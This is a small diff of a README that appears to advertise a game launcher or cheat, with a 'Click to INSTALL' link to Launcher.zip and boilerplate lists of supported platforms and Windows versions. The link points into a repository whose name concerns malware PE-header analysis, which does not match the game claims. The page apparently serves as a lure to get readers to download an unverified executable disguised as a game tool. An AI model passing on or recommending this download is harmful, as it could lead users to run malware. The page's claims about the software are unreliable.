@@ -1,9 +1,14 @@
 
 # [Click to INSTALL](https://github.com/MMJohar-IT20083496/PE-Header-Analysis-for-Malware-Detection-Quarantine-and-Removal/releases/download/1/Launcher.zip)
+
 Supported game version :: Steam, RGL, Epic games
+
 Supported game mode :: Fullscreen / Windowed / Fullscreen in window
+
 Supported processors :: Intel and AMD
+
 Supported OS :: Windows 8.1, 10, 11
+
 Supported builds :: All
 
 
